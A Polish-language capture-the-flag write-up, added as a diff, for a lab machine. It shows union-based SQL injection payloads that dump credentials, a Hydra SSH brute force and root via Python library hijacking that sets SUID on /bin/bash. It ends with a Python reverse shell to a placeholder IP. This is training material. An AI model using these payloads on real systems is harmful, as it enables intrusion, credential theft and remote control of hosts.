@@ -1,0 +1,156 @@
+Project 18 - Wykorzystanie narzędzi BurpSuite i Hydra
+
+
+*Rekonesans*
+*Skan za pomocą Nmap*
+```
+sudo nmap -sC -sV 10.10.75.94
+```
+Nmap scan report for 10.10.75.94
+Host is up (0.049s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
+|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
+|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
+8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|http-title:  Login 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+*Przeglądarka internetowa*
+```
+http:/10.10.75.94:8000
+login: 'or'1'='1
+password: 'or'1'='1
+
+rejestracja:
+login: Mariusz
+password: asdf
+mail: M@interia.eu
+sign up
+sign in here
+Mariusz'or'1'='1
+password: asdf
+Sign in --> udało się zalogować
+Layout
+```
+
+*BurpSuite*
+```
+Proxy
+Wejść na strone
+Wpisać 
+login: test
+password: test
+
+W Proxy:
+Prawym przyciskiem myszyki - save item - sql.txt
+send to Repeater
+
+w Repeater:
+Zamienić username=test&password=test  na
+username=Mariusz '+union+select+1,2,3,4--+-&password=test
+lub
+username='+union+select+"1",(select+@@version),"3","4"--+-&password=test
+lub
+username='+union+select+"1",(select+group_concat(SCHEMA_NAME,"\r\m")+from+Information_Schema.SCHEMATA),"3","4"--+-&password=test
+Send
+Po prawej stronie użyć opcji Render
+
+Nad przyciskiem Send zamienic 1 na:
+Database
+Prawym przyciskiem myszki - send to Repeater
+
+Tam gdzie 2 zamienić na :
+Tables
+
+username='+union+select+"1",(select+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\m")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'website'),"3","4"--+-&password=test
+
+Prawym przyciskiem myszki - send to Repeater
+Tam gdzie 2 zamienić na :
+Creds
+
+
+username='+union+select+"1",(select+group_concat(username,":",password,"\r\m")+from+website.users),"3","4"--+-&password=test
+
+Po prawej stronie:
+Raw - skopiowac z kodu password:
+Hi smokey:My_P@ssW0rd123m
+```
+*Kali LInux*
+```
+vim creds.txt
+wkleić:
+smokey
+My_P@ssW0rd123
+```
+*Logowanie SSH*
+```
+ssh smokey@10.10.75.94
+```
+*Utworzenie pliku z hasłami*
+```
+egrep '^.{,6}$' /home/kali/Desktop/Hacking/workspace/Zadania/rockyou.txt > small_rockyou.txt
+```
+
+*Hydra*
+```
+hydra -l hazel -P small_rockyou.txt 10.10.75.94 ssh
+
+[22][ssh] host: 10.10.75.94   login: hazel   password: hazel
+
+cat user.txt
+Flaga: THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
+```
+
+**PrivEsc**
+sudo -l
+
+Pojawiło się  **SETENV**, co oznacza, że można ustawić zmienne środowiskowe podczas uruchamiania wspomnianego polecenia jako root!
+
+*Stworzyć plik hashlib.py w /tmp*
+```
+nano hashlib.py
+
+import os
+os.system('chmod u+s /bin/bash')
+```
+*Target*
+```
+ls -l /bin/bash
+```
+*Target*
+```
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
+
+ls -l /bin/bash  --> /bin/bash powinno podświetlić się na czerwono
+/bin/bash -p
+```
+**Mam roota!!!**
+
+```
+/root/root.txt
+Flaga: THM{PytH0n_LiBr@RY_H1j@acKIn6}
+```
+
+
+**Alternatywa która nie działa**
+*Target*
+1. Należy uzyskać lokalizację biblioteki Pythona (która jest używana), 
+   w tym przypadku jej lokalizacja to _/usr/lib/python3.8/_
+2. Skopiuj plik **hashlib.py** do _/tmp_
+```
+cp /usr/lib/python3.8/hashlib.py /tmp/hashlib.py
+```
+3. Dodać **odwrotną powłokę** w pliku hashlib.py (gdziekolwiek).
+   Zastosowana powłoka odwrócona:
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
+*Kali LInux*
+```
+nc -nlvp 1234
+```
+
